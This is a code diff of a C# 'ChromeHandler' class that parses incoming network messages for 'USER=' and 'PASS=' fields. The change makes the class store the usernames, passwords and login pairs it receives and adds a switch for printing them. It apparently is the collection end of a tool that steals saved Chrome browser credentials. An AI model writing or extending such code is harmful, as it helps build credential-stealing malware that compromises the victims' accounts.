@@ -1,14 +1,17 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Threading;
-using PS03.Network.Receive.PostOp;
+using PS03.PostOp;
 
 namespace PS03.Network.Receive.Handlers
 {
     public class ChromeHandler
     {
+
+        public bool Printing = true;
         private bool first = true;
         private readonly Mutex mtx = new Mutex();
-        private readonly PasswordCounter pwc = PasswordCounter.Instance;
+        private readonly DataCounter pwc = DataCounter.Instance;
 
 
         public void Handle(string data)
@@ -26,8 +29,11 @@ namespace PS03.Network.Receive.Handlers
             var User = data.Substring(usrMark + ("USER=").Length, pasMark - (usrMark + ("USER=").Length));
 
             var Password = data.Substring(pasMark + ("PASS=").Length, data.Length - (pasMark + ("PASS=").Length));
-            pwc.Add(Password);
-            Print(Action, User, Password);
+            pwc.AddPassword(Password);
+            pwc.AddUsername(User);
+            pwc.AddLogin(new KeyValuePair<string, string>(User, Password));
+            if(Printing)
+                Print(Action, User, Password);
         }
 
         private void Print(string action, string user, string pass)
